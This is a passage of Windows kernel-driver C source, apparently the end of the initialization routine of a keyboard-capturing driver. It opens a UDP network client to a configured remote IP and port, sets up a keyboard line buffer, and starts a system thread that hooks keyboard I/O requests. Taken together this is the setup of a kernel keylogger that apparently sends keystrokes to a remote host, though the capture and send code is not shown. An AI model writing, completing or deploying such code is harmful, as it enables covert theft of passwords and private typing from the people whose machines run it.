    Status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);

	if (!NT_SUCCESS(Status))
	{
		KBD_ERROR("WSKStartup failed: 0x%08X", Status);
		goto Cleanup;
	}

	Status = NetClient_Initialize(
		KBDDRIVER_REMOTE_IP,
		KBDDRIVER_REMOTE_PORT,
		AF_INET, 
		SOCK_DGRAM);

	if (!NT_SUCCESS(Status))
	{
		KBD_ERROR("NetClient_Initialize failed: 0x%08X", Status);
		goto Cleanup;
	}

	//
	// Initialize keyboard line buffer
	//
	KbdHandler_InitializeBuffer();

    //
    // Start IRP hooking thread
    //
    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        KbdThread_IrpHookInit,
        NULL);

    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("PsCreateSystemThread KbdThread_IrpHookInit failed: 0x%08X", Status);
        goto Cleanup;
    }

    if (ThreadHandle != NULL)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    KBD_INFO("Driver initialization completed successfully");
    return STATUS_SUCCESS;

Cleanup:
    if (ThreadHandle != NULL)
    {
        ZwClose(ThreadHandle);
    }

    if (KbdDriverObject != NULL)
    {
        ObDereferenceObject(KbdDriverObject);
    }

    if (g_FilterDeviceObject != NULL)
    {
        IoDeleteDevice(g_FilterDeviceObject);
        g_FilterDeviceObject = NULL;
    }

    KBD_ERROR("Driver initialization failed: 0x%08X", Status);
    return Status;
}